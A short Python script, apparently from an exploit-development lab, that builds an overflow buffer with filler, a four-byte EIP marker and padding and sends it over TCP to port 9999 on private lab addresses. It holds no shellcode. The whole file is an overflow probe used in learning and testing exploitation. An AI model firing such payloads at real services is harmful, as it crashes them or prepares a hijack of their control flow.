import socket

filler = "A" * 524
eip = "B" * 4
offset = "C" * 472
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

input = filler + eip + offset + buffer

input = input.encode("utf-8")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(("192.168.56.101",9999))
s.connect(("192.168.130.10",9999))
s.send(input)
s.close()
print("done");